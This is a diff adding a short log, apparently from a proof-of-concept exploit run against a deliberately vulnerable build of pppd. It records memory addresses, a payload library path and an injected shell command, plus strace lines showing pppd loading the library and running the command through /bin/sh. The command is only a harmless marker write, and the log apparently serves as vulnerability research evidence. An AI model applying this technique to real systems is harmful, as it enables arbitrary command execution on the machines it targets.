@@ -1,0 +1,26 @@
+=== W133 dlopen wire command ===
+binary=build-vuln-nopie/pppd/pppd
+mode=attack
+callback=0x40cd70
+signal=INT
+expect=created
+side_effect_observed=True
+victim_content_after='PPPD2SHELL_W133_SECOND_COMMAND\n'
+process_rc=-11
+nak_sha256=ef76d22ebd852ca3ad1877f6095e3f0420c3103e38cf42ccb238228097f3f878
+rej_norm_sha256=313174822082f5bb3b1e2b429b0ecbbb882d726f5fee622ecafbe3504f0551b4
+layout.callback=0x40cd70
+layout.path=/tmp/MARKER-payload.so
+layout.wire_cmd=echo PPPD2SHELL_W133_SECOND_COMMAND > /tmp/MARKER-victim
+layout.cmd_ptr=0x468888
+layout.path_ptr=0x468844
+layout.notifier_ptr=0x46882c
+layout.sigreceived_offset=1856
+the_channel=0x4688a8
+sigreceived=0x46882c
+strace: PID --- SIGINT {si_signo=SIGINT, si_code=SI_USER, si_pid=PID, si_uid=0} ---
+strace: PID openat(AT_FDCWD, "/tmp/MARKER-payload.so", O_RDONLY|O_CLOEXEC) = 12
+strace: PID execve("/bin/sh", ["sh", "-c", "--", "echo PPPD2SHELL_W133_SECOND_COMM"...], 0xADDR /* 12 vars */ <unfinished ...>
+strace: PID openat(AT_FDCWD, "/tmp/MARKER-victim", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+pppd: Terminating on signal 2
+pppd: Fatal signal 11
